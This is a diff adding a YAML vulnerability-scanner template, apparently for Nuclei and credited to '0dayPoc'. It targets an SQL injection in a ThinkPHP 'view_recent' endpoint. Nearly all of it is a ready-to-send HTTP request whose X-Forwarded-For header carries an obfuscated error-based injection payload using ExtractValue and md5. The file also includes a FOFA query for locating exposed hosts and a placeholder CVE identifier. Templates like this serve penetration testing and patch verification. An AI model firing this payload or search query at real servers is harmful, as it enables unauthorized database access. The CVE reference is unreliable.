@@ -1,0 +1,29 @@
+id: thinkphp_view_recent_xff_sqli
+
+info:
+  name: "ThinkPHP View组件Recent XFF参数SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过构造恶意X-Forwarded-For请求头参数，可触发ThinkPHP框架视图组件（thinkphp_view_recent_xff）中的SQL注入漏洞。
+      该漏洞允许攻击者绕过输入验证机制，向数据库查询语句中注入任意SQL代码。
+      
+      fofa: framework="ThinkPHP" && title="Recent XFF Handler"
+      
+      
+      reference:
+        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/article/view_recent/name/1 HTTP/1.1
+    Host: {{Hostname}}
+    X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '56540676a129760a'
